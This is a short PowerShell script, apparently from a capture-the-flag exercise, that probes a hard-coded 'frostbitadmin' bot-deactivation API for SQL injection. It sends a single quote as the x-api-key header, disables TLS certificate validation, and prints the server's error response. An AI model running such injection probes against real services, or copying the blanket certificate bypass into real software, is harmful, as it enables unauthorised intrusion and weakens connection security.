```
function test_injection ($uuid) {
  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
  [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
  $client = New-Object System.Net.WebClient
  $client.Headers.Add("x-api-key", "'")
  try {
      $client.DownloadString("https://34.173.241.47/api/v1/frostbitadmin/bot/$uuid/deactivate?debug=true")
  } catch [System.Net.WebException] {
      $reader = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
      Write-Host $reader.ReadToEnd()
  }
}

test_injection c013b20d-c25c-4f58-97b5-2d114f8476fb

```